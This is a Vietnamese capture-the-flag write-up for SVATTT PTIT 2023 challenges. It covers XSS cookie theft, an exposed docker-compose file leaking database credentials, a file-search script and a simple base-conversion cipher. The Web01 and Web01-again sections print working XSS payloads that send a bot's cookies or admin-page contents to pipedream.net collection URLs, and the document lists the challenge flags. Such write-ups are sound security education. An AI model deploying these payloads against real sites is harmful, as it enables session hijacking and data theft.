# SVATTT 2023

Đây là tổng hợp Writeup CTF Tuyển chọn SVATT PTIT 2023

## Overview

| Title | Category | Flag |
| :---- | :------- | :--- |
| [Web01](#web01) | Web | ATTT{3z X2S From V@tv069 With LOv3} |
| [Web02](#web02) | Web | ATTT{4_51mpl3_r3v_5ql} |
| [Web01-again](#web01-again) | Web | ATTT{4c3076335f56407476303639} |
| [For01](#for01) | Programming | ATTT{https://www.youtube.com/watch?v=4qNALNWoGmI} |
| [Crypto01](#crypto01) | Crypto | ATTT{Meow_meow meow meow_tra_lai_tam_tri_toi_day} |


### Web01

![image](./writeupfiles/web1.png)

Chúng ta được cho 2 link, 1 là link challenge, 2 là link của con bot. Kinh nghiệm cho mình thấy đây là 1 bài Reflected XSS để lấy cookie

Sau khi đăng ký và đăng nhập, đây là UI của web challenge gồm 1 form để nhập note

Test thử với payload đơn giản `<img src=x onerror=alert(1)`, nhận thấy trang web bị lỗi XSS.

![image](./writeupfiles/web1-alert.png)

Ý tưởng bây giờ là khai thác Reflected XSS để lấy cookie của bot. Payload để lấy cookie của bot:

```
<img src=x onerror="this.src='https://eo4kqgjvne2o998.m.pipedream.net/?'+document.cookie; this.removeAttribute('onerror');">
```

Sau khi gửi đường link cho bot, mã Javascript được thực thi, ẽ gửi GET HTTP request đến URL requestbin kèm với cookie của bot

![image](./writeupfiles/web1-cookie.png)

Thay cookie của người dùng bằng Cookie của bot, truy cập admin panel ta sẽ lấy được flag

![image](./writeupfiles/web1-change.png)

Flag:

![image](./writeupfiles/web1-flag.png)

### Web02

![image](./writeupfiles/web2.png)

UI của challenge là 1 form search

![image](./writeupfiles/web2-ui.png)

Form search làm mình nghĩ ngay đến SQLi. Nhưng sau khi test thử với Burp Suite và sqlmap thì mình không detect được SQLi xD

dirsearch URL của challenge, tìm được 1 endpoint thú dzị là `/docker-compose.yml`

![image](./writeupfiles/web2-list-dir.png)

Truy cập `/docker-compose.yml` lấy được password vào mysql db 

![image](./writeupfiles/web2-docker.png)

Chui vào db mình lấy được flag

![image](./writeupfiles/web2-flag.png)

### Web01-again

![image](./writeupfiles/again.png)

Vẫn là cái UI của bài web01 trước

vẫn là con BOT cũ

![image](./writeupfiles/again-bot.png)

Nhưng cái khác ở đây là không thể dùng Reflected XSS để lấy cookie của bot do có flag http-only

![image](./writeupfiles/again-cookie.png)

Ý tưởng của mình là thay vì lấy cookie của con bot để vào được admin panel, giờ mình sẽ điều khiển con bot lấy luôn flag về cho mình

```
<script>
   var req = new XMLHttpRequest(); // Initializes the request object
   req.onload=reqListener; // Set the listener reqListener that is triggered when the response is ready
   var url="http://167.172.80.186:9999/admin.php"; // Initializes the URL of the PHP info page
   req.withCredentials=true; // Send the cookie header
   req.open("GET",url,false); // The request will be sent to the PHP info page of Metasploitable 2 (192.168.240.128) through the GET method synchronously
   req.send(); // Send the request
   function reqListener() {
      var req2=new XMLHttpRequest(); 
      const sess=this.responseText.substring(this.responseText.indexOf("ATTT"));
      req2.open("GET","https://eoisvenotwsj688.m.pipedream.net/?data="+btoa(sess),false);
      req2.send() 
   };
</script>
```

đầu tiên bot sẽ truy cập vào trang admin

Sau đó nó sẽ lọc response để lấy ra flag theo format ATTT{.......}

bước cuối nó gửi flag để server của mình, mã hóa base64 để tránh việc request URL quá dài

![image](./writeupfiles/again-solve.png)

giải ra chúng ta có flag

![image](./writeupfiles/again-flag.png)

### For01

![image](./writeupfiles/for1.png)

Ok, challenge này cho chúng ta 1 file rar, sau khi giải nén cấu trúc thư mục sẽ như thế này

![image](./writeupfiles/for1-list.png)

Tóm gọn lại là có 100 thư mục được đánh dấu từ 0-100, trong mỗi thư mục lại có 100 thư mục được đặt tên từ 0-100. 

Trong mỗi thư mục con lại có 100 file .txt 0.txt đến 100.txt.

Nhiệm vụ của chúng ta là tìm ra flag trong đống file .txt đấy. Mình dùng python để tự động hóa quá trình tìm flag. Đây là source code:

```
import os

for i in range(0,101):
    for j in range(0,101):
        for filename in os.listdir('./{}/{}/'.format(i,j)):
            f = open('./{}/{}/'.format(i,j)+filename,'r')
            r = f.read()
            if r != "almost" and r != "no" and r!="nah" and r!="you_got_it" and r!="try_again" and r!="Not_this_time" and r!="so_close" and r!="nope" and r!="better_luck_next_time":
                print(r)
```

Mình sử dụng 2 vòng lặp và đọc tất cả các file .txt trong thư mục con, kết quả tìm ra flag

![image](./writeupfiles/for1-flag.png)

### Crypto01

![image](./writeupfiles/crypt1.png)

Source code enc.cpp:

```
#include <iostream>
#include <string>
using namespace std;

#define EL printf("\n")

string flag = "ATTT{fake_flag}";

void bases(string &s) {
    for (int i = 0; i < s.size(); i += 4)
        printf("%o %u %x %u ", (unsigned char) s[i], (unsigned char) s[i + 1], (unsigned char) s[i + 2], (unsigned char) s[i + 3]);
    EL;
}

int main() {
    freopen("res.txt", "w", stdout);
    bases(flag);

    return 0;
}
```

Thuật toán: Lấy 4 kí tự liền nhau, kí tự đầu tiên sẽ chuyển về dạng octal, kí tự thứ 2 là dạng decimal, kí tự thứ 3 là dạng hex và kí tự thứ 4 tiếp tục là decimal, và lặp lại như vậy đến khi hết chuỗi.

Mình hiểu thuật toán nhưng quên mất cách code c++, code python thì lú nên tức quá quay ra làm bằng tay. Bật 4 tab cyberchef và quẩy tầm 2,3p mình được flag ám ảnh nhất mình từng tìm được

![image](./writeupfiles/crypt1-flag.png)
